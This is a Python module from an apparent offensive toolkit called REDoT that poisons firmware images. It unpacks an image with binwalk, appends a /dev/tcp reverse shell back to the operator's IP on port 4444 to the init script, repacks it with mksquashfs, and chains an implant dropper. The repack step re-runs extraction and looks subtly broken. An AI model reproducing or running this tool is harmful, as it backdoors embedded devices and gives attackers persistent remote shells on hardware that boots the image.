#!/usr/bin/env python3
# modules/firmware/firmware_poisoner.py

import os
import shutil
import socket
import subprocess
from datetime import datetime
import json

FIRMWARE_INPUT = "firmware/image.bin"
UNPACKED_DIR = "firmware/unpacked"
MODIFIED_FIRMWARE = "firmware/firmware_poisoned.bin"
REPORT_LOG = "reports/firmware_poison_log.json"
INIT_SCRIPT = "etc/init.d/rcS"
REVERSE_PORT = 4444


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


def generate_reverse_shell(ip, port=REVERSE_PORT):
    return f"\n\n# REDoT Payload Injected\n/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1\n"


def unpack_firmware():
    print("[*] Unpacking firmware...")
    os.makedirs(UNPACKED_DIR, exist_ok=True)
    result = subprocess.run(["binwalk", "-e", FIRMWARE_INPUT], capture_output=True, text=True)
    if "Extracted" not in result.stdout:
        raise RuntimeError("Binwalk failed to extract firmware.")
    for root, dirs, files in os.walk("firmware/_image.bin.extracted"):
        if INIT_SCRIPT in [os.path.relpath(os.path.join(root, f), "firmware/_image.bin.extracted") for f in files]:
            return os.path.join(root, INIT_SCRIPT)
    raise FileNotFoundError("Could not find init script in unpacked image.")


def inject_payload(init_path, ip):
    print("[*] Injecting payload into init script...")
    with open(init_path, "a") as f:
        f.write(generate_reverse_shell(ip))


def repack_firmware():
    print("[*] Repacking firmware image...")
    squashfs_root = os.path.dirname(os.path.abspath(unpack_firmware()))
    subprocess.run(["mksquashfs", squashfs_root, MODIFIED_FIRMWARE, "-noappend", "-comp", "gzip"], check=True)


def chain_uart_extractor():
    print("[*] Launching UART extraction...")
    subprocess.run(["python3", "modules/hardware/uart_extractor.py", "--input", MODIFIED_FIRMWARE])


def drop_implant():
    print("[*] Deploying implant via implant_dropper...")
    subprocess.run(["python3", "modules/payloads/implant_dropper.py", "--source", MODIFIED_FIRMWARE])


def push_to_dashboard(info):
    try:
        import requests
        requests.post("http://localhost:5000/api/firmware_alert", json=info, timeout=3)
    except:
        print("[!] Could not push to dashboard server.")


def log_report(payload_ip):
    os.makedirs("reports", exist_ok=True)
    report = {
        "timestamp": datetime.now().isoformat(),
        "original_image": FIRMWARE_INPUT,
        "modified_image": MODIFIED_FIRMWARE,
        "payload_ip": payload_ip,
        "reverse_port": REVERSE_PORT,
        "modules_chained": ["uart_extractor.py", "implant_dropper.py"]
    }
    with open(REPORT_LOG, "w") as f:
        json.dump(report, f, indent=2)
    return report


def check_permissions():
    for d in ["firmware", "reports"]:
        if not os.access(d, os.W_OK):
            raise PermissionError(f"Directory '{d}' is not writable.")


def main():
    print("=== REDoT Firmware Poisoner ===")
    check_permissions()
    attacker_ip = get_local_ip()
    print(f"[+] Detected local IP: {attacker_ip}")

    init_path = unpack_firmware()
    inject_payload(init_path, attacker_ip)
    repack_firmware()
    chain_uart_extractor()
    drop_implant()
    report = log_report(attacker_ip)
    push_to_dashboard(report)
    print("[+] Firmware poisoning complete. Image ready at:", MODIFIED_FIRMWARE)


if __name__ == "__main__":
    main()
